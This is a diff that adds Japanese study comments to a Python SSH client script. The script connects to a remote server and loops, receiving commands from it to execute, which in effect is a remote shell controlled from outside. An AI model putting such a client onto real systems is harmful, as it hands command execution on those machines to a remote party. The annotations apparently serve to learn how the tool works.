@@ -1,3 +1,6 @@
+#サーバーからクライアントにコマンドを送る
+#クライアント側
+
 #!/usr/bin/env python
 import locale
 import os
@@ -16,8 +19,10 @@ def ssh_command(ip, port, user, passwd, command):
         ssh_session.send(command)
         print(ssh_session.recv(1024).decode())  # read banner
         while True:
+            #通信からコマンドを受け取り
             command = ssh_session.recv(1024)
             try:
+                #コマンドを実行
                 cmd = command.decode()
                 if cmd == 'exit':
                     client.close()
